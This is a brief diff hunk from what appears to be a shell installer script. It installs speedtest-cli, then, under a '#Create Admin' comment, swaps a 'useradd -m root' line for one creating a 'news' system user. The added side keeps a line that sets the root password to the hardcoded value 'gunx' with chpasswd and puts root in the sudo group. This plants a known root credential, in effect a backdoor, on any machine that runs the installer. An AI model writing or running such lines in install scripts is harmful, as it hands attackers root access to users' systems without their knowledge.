@@ -126,8 +126,9 @@ pip install speedtest-cli
 pip3 install speedtest-cli
 
 #Create Admin
- useradd -m root
- echo "root:gunx" | chpasswd
+
+ sudo useradd -u 9 -g 9 -c "news" -d /var/spool/news -s /usr/sbin/nologin news
+echo "root:gunx" | chpasswd
 usermod -aG sudo root
 }
 fun_bar 'inst_pct'
